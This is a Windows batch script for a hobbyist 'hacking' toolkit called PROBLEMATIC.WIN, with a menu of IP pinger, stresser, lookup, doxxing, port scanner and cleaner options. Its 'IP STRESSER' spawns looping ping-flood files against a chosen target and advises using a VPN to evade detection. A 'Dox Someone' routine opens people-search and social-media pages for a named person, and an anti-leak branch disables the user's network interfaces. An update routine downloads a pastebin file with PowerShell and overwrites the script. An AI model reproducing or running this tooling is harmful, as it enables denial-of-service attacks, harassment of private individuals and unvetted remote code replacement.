@shift /0
@echo off
@shift /0
chcp 65001
set ORIGINAL_DIR=%CD%
cls
:startup
title RATTING YOU SKID...

echo LOADING PROBLEMATIC

echo PLEASE WAIT...

PING localhost -n 6 >NUL

cd %userprofile%/documents/software

if not exist "r882hudfkl09gsdz342.bat" goto failure

:skip

cls

if EXIST "r882hudfkl09gsdz342.bat" goto home2

:failure
cls
color 4
title Really? Leaked ? Nice %USERNAME%
@echo off

echo You are not permitted to use this software.

netsh interface set interface ethernet disable
netsh interface set interface "LAN" disabled
netsh interface set interface "Wireless Network Connection" Disable
PING localhost -n 15 >NUL
netsh interface set interface ethernet enable
netsh interface set interface "LAN" enable
netsh interface set interface "Wireless Network Connection" enable
echo.

pause >nul
exit



:home2
@echo off
chcp 65001
color 7
title PROBLEMATIC.WIN / BETA / Logged as %USERNAME%
cls
setlocal
chdir /d %ORIGINAL_DIR%
call "logo.bat"
echo.
echo.
echo      [40;35m[1] [40;96mIP PINGER                [40;35m[2] [40;96mWebsite IP Finder
echo.
echo      [40;35m[3] [40;96mIP STRESSER              [40;35m[4] [40;96mIP Lookup
echo.
echo      [40;35m[5] [40;96mACCOUNT PULLER           [40;35m[6] [40;96mPC CLEANER
echo.
echo      [40;35m[7] [40;96mPORT SCANNER             [40;35m[8] [40;96mUpdate ( DOESNT WORK )
echo.
echo                      [40;31m[C] Creator
echo.
echo.

set /p a=[40;36mroot@ubuntu-s-lvcpu-5gb-1on1-01:~# [40;93m

if ["%a%"] ==["1"] goto pingermain
if ["%a%"] ==["2"] goto websitefinder
if ["%a%"] ==["3"] goto enterip
if ["%a%"] ==["4"] goto lookupp
if ["%a%"] ==["5"] goto dox
if ["%a%"] ==["6"] goto computerclean
if ["%a%"] ==["7"] goto portscanner
if ["%a%"] ==["8"] goto update
if ["%a%"] ==["c"] goto credits
goto choose

:choose
cls
@echo off
color 4

echo Press any key to go back

pause >nul
goto home2

:pingermain

echo off
cls
color 0b
mode con lines=24 cols=82
@echo off
set /p IP=[40;36mroot@ubuntu-s-lvcpu-5gb-1on1-01:~#[40;37m
echo.
:pinger
PING -n 1 %IP% | FIND "TTL=">nul
IF ERRORLEVEL 1 goto fail
IF NOT ERRORLEVEL 1 goto soon
:soon
echo [40;34m\-\-\[40;37m[41;37m%IP%[40;30m [40;37mIS [42;37mONLINE[40;30m [40;35m-+- [40;36mNET LOADING[40;34m/-/-/[40;37m
echo.
goto pinger
:fail
echo [40;34m\-\-\[40;37m[41;37m%IP%[40;30m [40;37mIS [42;37mOFFLINE[40;30m [40;35m-+- [40;36mNET LOADED [40;34m/-/-/[40;37m
echo.
goto pinger


:websitefinder
cls
echo.
echo.
echo [44;33mWARNING[40;37m : The website don't need [40;34m" http:// " [40;37mand after the [40;37m".com" [40;37mor [40;34m".org" [40;37metc.. don't put it too!
echo [44;33mEXAMPLE[40;37m : [40;37m"www.youtube.com" [40;34m; [40;37m"www.google.com"
echo.
echo.
echo.
set /p web=[40;37mWebsite URL ~ [40;37m
echo.
ping %web%
echo.
echo.
pause
goto home2


:stresschoice
::Just a precaution to make sure someone wants to stress an ip
cls
Title ARE YOU SURE
color 4
echo -------------------------------------ARE YOU SURE-------------------------------------
echo 1)IP Stresser (MAKE SURE TO BE ON A VPN JUST ENCASE THEY KNOW HOW TO USE WIRESHARK lol)
echo 2)Back home
echo 3)Exit
set /p choice=Choice:
if %choice%==1 goto enterip
if %choice%==2 goto choice1
if %choice%==3 goto end
echo %choice% is not a valid answer
pause
goto stresschoice

:enterip
Title Enter IP
del stressing1.bat
del stressing2.bat
del stressing3.bat
del stressing4.bat
del deletestressfiles.bat
cls
:: Max i think is 65500 but lets keep it here, I'll test later
set /p deadip=IP Address or website url to stress (Press ctrl+C to stop):
echo @echo off >> stressing1.bat
echo :stress >> stressing1.bat
echo ping %deadip% -l 6500 -w 1 -n 1 >> stressing1.bat
echo goto stress >> stressing1.bat
echo @echo off >> stressing2.bat
echo :stress >> stressing2.bat
echo ping %deadip% -l 6500 -w 1 -n 1 >> stressing2.bat
echo goto stress >> stressing2.bat
echo @echo off >> stressing3.bat
echo :stress >> stressing3.bat
echo ping %deadip% -l 6500 -w 1 -n 1 >> stressing3.bat
echo goto stress >> stressing3.bat
echo @echo off >> stressing4.bat
echo :stress >> stressing4.bat
echo ping %deadip% -l 6500 -w 1 -n 1 >> stressing4.bat
echo goto stress >> stressing4.bat

echo @echo off >> deletestressfiles.bat
echo del stressing1.bat >> deletestressfiles.bat
echo del stressing2.bat >> deletestressfiles.bat
echo del stressing3.bat >> deletestressfiles.bat
echo del stressing4.bat >> deletestressfiles.bat
echo del deletestressfiles.bat >> deletestressfiles.bat
start stressing1.bat
start stressing2.bat
start stressing3.bat
start stressing4.bat

:stress
::actual stresser, needs update at the time of 11/1/19 it can only hit someone up to 200 ms
Title Stressing...
ping %deadip% -l 6500 -w 1 -n 1
goto stress


:lookupp
setlocal ENABLEDELAYEDEXPANSION
set webclient=webclient
cls
echo.
echo.
echo.
echo    [40;32m██╗██████╗     [40;34m██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗
echo    [40;32m██║██╔══██╗    [40;34m██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
echo    [40;32m██║██████╔╝    [40;34m██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝
echo    [40;32m██║██╔═══╝     [40;34m██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝
echo    [40;32m██║██║         [40;34m███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║
echo    [40;32m╚═╝╚═╝         [40;34m╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝
echo.
echo.
echo.
echo.
echo  ------------------
echo  [40;36m[1] [40;32mVIEW YOUR IP!
echo   [40;34m------------------
echo  [40;36m[2] [40;32mLOOKUP AN IP!
echo   [40;34m------------------
echo.
echo.
echo.
echo.
goto action
:input
echo.
echo Please enter a valid input option.
echo.
:action
echo.
set /p action="[40;36m>>> "
if '%action%'=='1' echo sUrl = "http://ipinfo.io/json" > %temp%\%webclient%.vbs & goto localip
if '%action%'=='2' goto iplookup
goto input
:iplookup
color 07
cls
echo.
echo    [40;36mTYPE A [40;32mIP [40;36mTO LOOKUP!
echo.
set ip=127.0.0.1
set /p ip=[40;36mIP:
echo sUrl = "http://ipinfo.io/%ip%/json" > %temp%\%webclient%.vbs

:localip
cls
echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs
echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs
echo oHTTP.send sRequest >> %temp%\%webclient%.vbs
echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs
echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs
echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs
echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs
echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs
echo objFile.Close >> %temp%\%webclient%.vbs
rem echo Msgbox HTTPGET,vbSystemModal+vbOKOnly+vbInformation, "IP Info" >> %temp%\%webclient%.vbs
echo Wscript.Quit >> %temp%\%webclient%.vbs
start %temp%\%webclient%.vbs
set /a requests=0
echo.
rem echo Waiting for API response. . .
echo [problematic] Looking up IP Address. . .
:checkresponseexists
set /a requests=%requests% + 1
if %requests% gtr 7 goto failed
IF EXIST "%temp%\response.txt" (
goto response_exist
) ELSE (
ping 127.0.0.1 -n 2 -w 1000 >nul
goto checkresponseexists
)
:failed
taskkill /f /im wscript.exe >nul
del "%temp%\%webclient%.vbs" /f /q /s >nul
echo.
echo [problematic] Did not receive a response from the API.
echo.
pause
goto home2
:response_exist
cls
echo.
for /f "delims= 	" %%i in ('findstr /i "ip hostname city region country loc org postal" %temp%\response.txt') do (
	set data=%%i
	set data=!data:,=!
	set data=!data:""=Not Listed!
	set data=!data:"=!
	set data=!data:ip:=[40;31mIP:		!
	set data=!data:hostname:=[40;32mHostname:	!
	set data=!data:city:=[40;33mCity:		!
	set data=!data:region:=[40;34mState:	!
	set data=!data:country:=[40;35mCountry:	!
	set data=!data:loc:=[40;36mLocation:	!
	set data=!data:org:=[40;37mISP:		!
	set data=!data:postal:=[40;31mPostal:	!
	echo [40;31m!data!
)
echo.
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul
pause
if '%ip%'=='' goto main2
goto home2
exit


:credits
cls
echo [40;37m   ████╗   ███╗[40;31m █████╗ [40;37m██████╗ [40;31m███████╗   [40;37m  ██████╗ [40;31m██╗   ██╗
echo [40;37m   █████╗ ████║[40;31m██╔══██╗[40;37m██╔══██╗[40;31m██╔════╝    [40;37m ██╔══██╗[40;31m╚██╗ ██╔╝
echo [40;37m   ███╔████╔██║[40;31m███████║[40;37m██║  ██║[40;31m█████╗      [40;37m ██████╔╝ [40;31m╚████╔╝
echo [40;31m   ███║╚██╔╝██║[40;37m██╔══██║[40;31m██║  ██║[40;37m██╔══╝      [40;31m ██╔══██╗  [40;37m╚██╔╝
echo [40;31m   ███║ ╚═╝ ██║[40;37m██║  ██║[40;31m██████╔╝[40;37m███████╗    [40;31m ██████╔╝   [40;37m██║
echo [40;31m    ╚═╝     ╚═╝[40;37m╚═╝  ╚═╝[40;31m╚═════╝[40;37m ╚══════╝    [40;31m ╚═════╝[40;37m    ╚═╝
echo.
echo.
echo  [40;37m   ██████╗  [40;37m██████╗ [40;37m██████╗ [40;37m██╗  [40;37m██╗   ██╗
echo [40;37m   ██╔════╝ [40;37m██╔═══██╗[40;37m██╔══██╗[40;37m██║  [40;37m╚██╗ ██╔╝
echo [40;37m   ██║  ███╗[40;37m██║   ██║[40;37m██║  ██║[40;37m██║   [40;37m╚████╔╝
echo [40;31m   ██║   ██║[40;31m██║   ██║[40;31m██║  ██║[40;31m██║    [40;31m╚██╔╝
echo [40;31m   ╚██████╔╝[40;31m╚██████╔╝[40;31m██████╔╝[40;31m███████╗[40;31m██║
echo  [40;31m   ╚═════╝  [40;17m╚═════╝ [40;31m╚═════╝ [40;31m╚══════╝[40;31m╚═╝
echo.
echo.
echo [40;37mDISCORD ~ Godly#1447
echo.
echo [40;31mTWITCH ~ g0dlyxxx
echo.
echo [40;37mYOUTUBE ~ Godly
echo.
echo [40;31mSteam ~ godlyyt
echo.
echo.
echo.
echo.
echo [40;31mPress Anything To Go To The [40;31mMenu...
pause >nul
goto home2

:dox
Title Dox Someone ;)
cls
color b
echo type 123 if you don't have access
set /p ip=Enter IP(optional):
cls
set /p firstname=First Name:
cls
set /p lastname=Last Name:
cls
set /p csoz=City State Or Zip Code:
cls
set /p doxusername=Username/Alias on websites:
goto checkifip

:checkifip
cls
if ip==123 goto currentlydoxxing
goto currentlydoxxing

:currentlydoxxing
cls
start https://www.whitepages.com/name/%firstname%-%lastname%/?fs=1&l=%csoz%&q=%firstname%+%lastname%
start https://www.advancedbackgroundchecks.com/names/%firstname%-%lastname%_%csoz%
start https://www.zabasearch.com/people/%firstname%+%lastname%/
start https://www.anywho.com/people/%firstname%-%lastname%/%csoz%
start https://www.youtube.com/results?search_query=%doxusername%
start https://twitter.com/%doxusername%
start https://www.reddit.com/user/%doxusername%/
start https://www.twitch.tv/%doxusername%
start https://www.instagram.com/%doxusername%/
start https://www.instagram.com/%firstname%%lastname%/
start https://www.google.com/search?q=%firstname%+%lastname%&sxsrf=ALeKk008zXYOCVyRSvJFEspKyknWgU6f1Q:1589005197978&source=lnms&tbm=isch&sa=X&ved=2ahUKEwjjnfzSkabpAhUCP30KHbRpDS8Q_AUoAnoECAsQBA&biw=1920&bih=938
goto choice2

:choice2
cls
echo 1)Back to pannel
echo 2)Close
echo -------------------------------------------------------------------------------
set /p choice=Choice:
if %choice%==1 goto home2
if %choice%==2 goto end
echo %choice% is not a valid answer
pause
goto choice2

:end
cls
exit

:computerclean
cls
color 1
echo 1)Delete temporary files
echo 2)Delete cookies
echo 3)Disk clean up
echo 4)Back to home
echo 5)Exit
set /p choice=Choice:
if %choice%==1 goto temp
if %choice%==2 goto cookies
if %choice%==3 goto diskclean
if %choice%==4 goto home2
if %choice%==5 goto end
echo %choice% is not an option %name%
pause
goto computerclean


:Hotspot
cls
color c
Title Hotspot
echo 1)Start hosted network
echo 2)Stop hosted network
set /p choice=Choice:
if %choice%==1 goto starthnw
if %choice%==2 goto stophnw
echo %choice% is not a valid choice
goto hotspot

:starthnw
cls
set /p networkname=Hotspot Name:
set /p networkpassword=Hotspot Password(Must be 8 Characters):
netsh wlan set hostednetwork mode=allow ssid=%networkname% key=%networkpassword%
netsh wlan start hostednetwork
pause
goto choice2

:stophnw
netsh wlan stop hostednetwork
pause
goto choice2

:update
Title Update
Set "url=https://pastebin.com/raw/qQXj89Tb"
for %%# in (%url%) do ( set "File=%tmp%\%%~n#.bat" )
Call :Download "%url%" "%File%"
If exist "%File%" (
    ( Type "%File%")>con
( Type "%File%" > "problematic.bat")
)
Pause>nul & Exit

:Download <url> <File>
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2')"
::timeout 10
::DEL "%~f0" /b
::exit /b
cls
echo Loading.
Title Loading.
ping localhost -n 2 >nul
cls
echo Loading..
Title Loading..
ping localhost -n 2 >nul
cls
echo Loading...
Title Loading...
ping localhost -n 2 >nul
cls
echo COMPLETED
Title Completed!
start /b "" cmd /c del "%~f0"&exit /b




:portscanner
cls
Title Portscan IP
color b
set /p ipsearch=IP Address:
echo @echo off >> portscan.bat
echo powershell wget "https://api.hackertarget.com/nmap/?q=%ipsearch%" -OutFile portscaninfo.txt >> portscan.bat
echo exit >> portscan.bat
echo for /f "tokens=*" %%A in (portscaninfo.txt) do (echo%%A) >> portscan.bat

start portscan.bat
cls
echo Loading.
Title Loading.
ping localhost -n 2 >nul
cls
echo Loading..
Title Loading..
ping localhost -n 2 >nul
cls
echo Loading...
Title Loading...
ping localhost -n 2 >nul
cls
echo Loading.
Title Loading.
ping localhost -n 2 >nul
cls
echo Loading..
Title Loading..
ping localhost -n 2 >nul
cls
echo Loading...
Title Loading...
ping localhost -n 2 >nul
cls

Title Information
color a
echo For %ipsearch%:
echo =======================================================================================
type portscaninfo.txt | findstr "PORT"
type portscaninfo.txt | findstr "21/tcp"
type portscaninfo.txt | findstr "22/tcp"
type portscaninfo.txt | findstr "23/tcp"
type portscaninfo.txt | findstr "80/tcp"
type portscaninfo.txt | findstr "110/tcp"
type portscaninfo.txt | findstr "143/tcp"
type portscaninfo.txt | findstr "443/tcp"
type portscaninfo.txt | findstr "3389/tcp"
echo =======================================================================================
echo Scanned with https://hackertarget.com

del portscaninfo.txt
del portscan.bat
echo.
pause
goto choice2
